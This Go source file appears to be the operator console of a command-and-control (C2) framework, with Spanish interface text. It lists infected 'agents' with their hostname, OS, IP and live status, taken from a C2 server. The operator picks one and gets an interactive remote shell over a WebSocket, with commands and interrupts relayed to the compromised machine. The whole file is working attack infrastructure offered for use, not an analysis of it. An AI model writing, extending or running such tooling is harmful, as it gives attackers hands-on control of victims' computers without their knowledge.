package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/gorilla/websocket"
	"golang.org/x/term"
)

// serverHost is the C2 server address. Override with C2_HOST env variable.
var serverHost = "localhost:5000"

// ANSI escape codes
const (
	ansiReset  = "\033[0m"
	ansiBold   = "\033[1m"
	ansiRed    = "\033[31m"
	ansiGreen  = "\033[32m"
	ansiYellow = "\033[33m"
	ansiCyan   = "\033[36m"
	ansiGray   = "\033[90m"
	ansiWhite  = "\033[97m"
)

// Agent mirrors the server's Agent model (no JSON tags on the server side,
// so field names are used as-is by encoding/json).
type Agent struct {
	UUID      string `json:"UUID"`
	IP        string `json:"IP"`
	Hostname  string `json:"Hostname"`
	OS        string `json:"OS"`
	LastSeen  string `json:"LastSeen"`
	Connected bool   `json:"Connected"`
	Active    bool   `json:"Active"`
}

// ── Helpers ───────────────────────────────────────────────────────────────────

func clearScreen() { fmt.Print("\033[2J\033[H") }

func truncate(s string, max int) string {
	if len(s) <= max {
		return s
	}
	return s[:max-1] + "…"
}

func printBanner() {
	fmt.Printf("%s%s", ansiCyan, ansiBold)
	fmt.Println("  ╔══════════════════════════════════════════════════════════╗")
	fmt.Println("  ║           C2 OPERATOR CONSOLE  ·  v1.0                  ║")
	fmt.Println("  ╚══════════════════════════════════════════════════════════╝")
	fmt.Print(ansiReset)
	fmt.Printf("  %sServidor:%s %s%s%s\n\n", ansiGray, ansiReset, ansiWhite, serverHost, ansiReset)
}

// ── API calls ─────────────────────────────────────────────────────────────────

func fetchAgents() ([]Agent, error) {
	resp, err := http.Get("http://" + serverHost + "/agents")
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var agents []Agent
	if err := json.NewDecoder(resp.Body).Decode(&agents); err != nil {
		return nil, err
	}
	if agents == nil {
		agents = []Agent{}
	}
	return agents, nil
}

func setActiveAgent(uuid string) error {
	body, _ := json.Marshal(map[string]string{"uuid": uuid})
	resp, err := http.Post(
		"http://"+serverHost+"/api/console/active-agent",
		"application/json",
		bytes.NewReader(body),
	)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("el servidor rechazó el agente (HTTP %d)", resp.StatusCode)
	}
	return nil
}

// ── Agent selector ────────────────────────────────────────────────────────────

// printAgentTable renders the agent list and returns them ordered (active first).
func printAgentTable(agents []Agent) []Agent {
	active := make([]Agent, 0, len(agents))
	offline := make([]Agent, 0)
	for _, a := range agents {
		if a.Connected && a.Active {
			active = append(active, a)
		} else {
			offline = append(offline, a)
		}
	}
	ordered := append(active, offline...)

	sep := fmt.Sprintf("  %s%s%s", ansiGray, strings.Repeat("─", 68), ansiReset)

	// ── Active section ──
	fmt.Printf("  %s%sAGENTES EN VIVO%s  %s(%d)%s\n",
		ansiBold, ansiGreen, ansiReset, ansiGray, len(active), ansiReset)
	fmt.Printf("  %s%-5s  %-18s  %-24s  %-16s  %s%s\n",
		ansiGray, "#", "HOSTNAME", "OS", "IP", "ESTADO", ansiReset)
	fmt.Println(sep)

	if len(active) == 0 {
		fmt.Printf("  %s  (ningún agente activo en este momento)%s\n", ansiGray, ansiReset)
	}
	for i, a := range active {
		hostname := truncate(a.Hostname, 16)
		osStr := truncate(a.OS, 22)
		fmt.Printf("  %s[%d]%s    %-18s  %-24s  %-16s  %s● LIVE%s\n",
			ansiCyan, i+1, ansiReset,
			hostname, osStr, a.IP,
			ansiGreen, ansiReset)
	}

	// ── Offline section ──
	if len(offline) > 0 {
		fmt.Printf("\n  %s%sHISTORIAL%s  %s(%d)%s\n",
			ansiBold, ansiGray, ansiReset, ansiGray, len(offline), ansiReset)
		fmt.Println(sep)
		for i, a := range offline {
			hostname := truncate(a.Hostname, 16)
			osStr := truncate(a.OS, 22)
			fmt.Printf("  %s[%d]%s    %-18s  %-24s  %-16s  %s○ offline%s\n",
				ansiGray, len(active)+i+1, ansiReset,
				hostname, osStr, a.IP,
				ansiGray, ansiReset)
		}
	}

	fmt.Println()
	return ordered
}

// runAgentSelector loops until the operator selects an agent or quits.
// Returns nil on quit.
func runAgentSelector() *Agent {
	for {
		clearScreen()
		printBanner()

		agents, err := fetchAgents()
		if err != nil {
			fmt.Printf("  %s[!]%s Sin conexión al servidor: %v\n", ansiRed, ansiReset, err)
			fmt.Printf("  %s[*]%s Reintentando en 3s...  (Ctrl+C para salir)\n\n", ansiYellow, ansiReset)
			time.Sleep(3 * time.Second)
			continue
		}

		ordered := printAgentTable(agents)
		total := len(ordered)

		if total > 0 {
			fmt.Printf("  %s[1-%d]%s Seleccionar  %s[r]%s Actualizar  %s[q]%s Salir\n\n",
				ansiCyan, total, ansiReset,
				ansiCyan, ansiReset,
				ansiRed, ansiReset)
		} else {
			fmt.Printf("  %s[r]%s Actualizar  %s[q]%s Salir\n\n",
				ansiCyan, ansiReset, ansiRed, ansiReset)
		}

		fmt.Printf("  %s>%s ", ansiYellow, ansiReset)

		reader := bufio.NewReader(os.Stdin)
		input, _ := reader.ReadString('\n')
		input = strings.TrimSpace(strings.ToLower(input))

		switch input {
		case "q", "quit", "exit", "":
			return nil
		case "r", "refresh":
			continue
		default:
			n, err := strconv.Atoi(input)
			if err != nil || n < 1 || n > total {
				fmt.Printf("  %s[!]%s Opción inválida: %q\n", ansiRed, ansiReset, input)
				time.Sleep(time.Second)
				continue
			}
			a := ordered[n-1]
			return &a
		}
	}
}

// ── Console session ───────────────────────────────────────────────────────────

// runConsole opens an interactive shell session with the selected agent.
func runConsole(agent *Agent) error {
	// 1. Tell the server which agent is active
	if err := setActiveAgent(agent.UUID); err != nil {
		return err
	}

	// 2. Connect to the operator console WebSocket
	u := url.URL{Scheme: "ws", Host: serverHost, Path: "/ws/console"}
	conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		return fmt.Errorf("conectando WebSocket: %w", err)
	}
	defer conn.Close()

	// Session header
	fmt.Printf("\n  %s[+]%s Sesión establecida con %s%s%s\n",
		ansiGreen, ansiReset, ansiBold+ansiWhite, agent.Hostname, ansiReset)
	fmt.Printf("  %s[*]%s Ctrl+D = cerrar sesión  ·  Ctrl+C = interrupción al agente\n",
		ansiYellow, ansiReset)
	fmt.Printf("  %s%s%s\n\n", ansiGray, strings.Repeat("─", 62), ansiReset)

	// 3. Switch stdin to raw mode for character-by-character input
	fd := int(os.Stdin.Fd())
	var (
		oldState *term.State
		isRaw    bool
		restored bool
	)
	if term.IsTerminal(fd) {
		oldState, err = term.MakeRaw(fd)
		if err == nil {
			isRaw = true
		}
	}
	restoreTerminal := func() {
		if !restored && isRaw {
			term.Restore(fd, oldState)
			restored = true
		}
	}
	defer restoreTerminal()

	// 4. Goroutine: WS messages → stdout
	done := make(chan struct{})
	go func() {
		defer close(done)
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				return
			}
			// The server's broadcastToOperators prepends a space — strip it.
			text := strings.TrimPrefix(string(msg), " ")
			fmt.Print(text)
		}
	}()

	// 5. Goroutine: stdin bytes → inputCh
	inputCh := make(chan []byte, 32)
	go func() {
		buf := make([]byte, 64)
		for {
			n, readErr := os.Stdin.Read(buf)
			if readErr != nil || n == 0 {
				return
			}
			chunk := make([]byte, n)
			copy(chunk, buf[:n])
			select {
			case inputCh <- chunk:
			case <-done:
				return
			}
		}
	}()

	// 6. SIGTERM handler (SIGINT is not raised in raw mode — Ctrl+C is byte 0x03)
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGTERM)
	defer signal.Stop(sigCh)

	// Local line buffer for echo + send-on-Enter
	lineBuf := make([]byte, 0, 256)
	skipEsc := 0 // bytes remaining in current escape sequence to ignore

	for {
		select {

		case <-done:
			restoreTerminal()
			fmt.Printf("\r\n\n  %s[*]%s Conexión cerrada por el agente.\n", ansiYellow, ansiReset)
			return nil

		case <-sigCh:
			restoreTerminal()
			fmt.Printf("\r\n\n  %s[*]%s Sesión terminada (SIGTERM).\n", ansiYellow, ansiReset)
			return nil

		case chunk, ok := <-inputCh:
			if !ok {
				return nil
			}
			for _, b := range chunk {
				// Ignore bytes that are part of escape sequences (arrow keys, F-keys, etc.)
				if skipEsc > 0 {
					skipEsc--
					continue
				}

				switch b {
				case 4: // Ctrl+D — close session gracefully
					restoreTerminal()
					conn.WriteMessage(websocket.TextMessage, []byte("exit\n"))
					time.Sleep(150 * time.Millisecond)
					fmt.Print("\r\n")
					return nil

				case 3: // Ctrl+C — send interrupt to the remote agent
					conn.WriteMessage(websocket.TextMessage, []byte("\x03"))
					fmt.Print("^C")
					lineBuf = lineBuf[:0]

				case 27: // ESC — start of multi-byte escape sequence
					skipEsc = 2 // skip '[' and the final key byte

				case 127, 8: // Backspace / DEL — local line editing
					if len(lineBuf) > 0 {
						lineBuf = lineBuf[:len(lineBuf)-1]
						fmt.Print("\b \b")
					}

				case '\r', '\n': // Enter — send buffered line to agent
					fmt.Print("\r\n")
					conn.WriteMessage(websocket.TextMessage, []byte(string(lineBuf)+"\n"))
					lineBuf = lineBuf[:0]

				default:
					if b >= 32 && b < 127 { // printable ASCII only
						lineBuf = append(lineBuf, b)
						fmt.Printf("%c", b)
					}
				}
			}
		}
	}
}

// ── Entry point ───────────────────────────────────────────────────────────────

func main() {
	// Allow overriding the server address via environment variable
	if h := os.Getenv("C2_HOST"); h != "" {
		serverHost = h
	}

	// Global SIGINT handler — only active when the terminal is NOT in raw mode
	// (raw mode suppresses SIGINT generation; Ctrl+C is handled as byte 0x03 instead)
	sigs := make(chan os.Signal, 1)
	signal.Notify(sigs, syscall.SIGINT)
	go func() {
		<-sigs
		fmt.Printf("\n\n  %s[*]%s Saliendo...\n\n", ansiCyan, ansiReset)
		os.Exit(0)
	}()

	clearScreen()
	printBanner()

	for {
		agent := runAgentSelector()
		if agent == nil {
			break
		}

		clearScreen()
		printBanner()
		fmt.Printf("  %s[~]%s Conectando con %s%s%s...\n\n",
			ansiCyan, ansiReset, ansiBold, agent.Hostname, ansiReset)

		if err := runConsole(agent); err != nil {
			fmt.Printf("\n  %s[!]%s Error en la sesión: %v\n", ansiRed, ansiReset, err)
			fmt.Printf("\n  Presiona Enter para continuar...\n  %s>%s ", ansiYellow, ansiReset)
			bufio.NewReader(os.Stdin).ReadString('\n')
		}

		fmt.Printf("\n  %s[*]%s Volviendo al menú principal...\n", ansiCyan, ansiReset)
		time.Sleep(time.Second)
	}

	fmt.Printf("\n  %s[*]%s Hasta luego, operador.\n\n", ansiCyan, ansiReset)
}
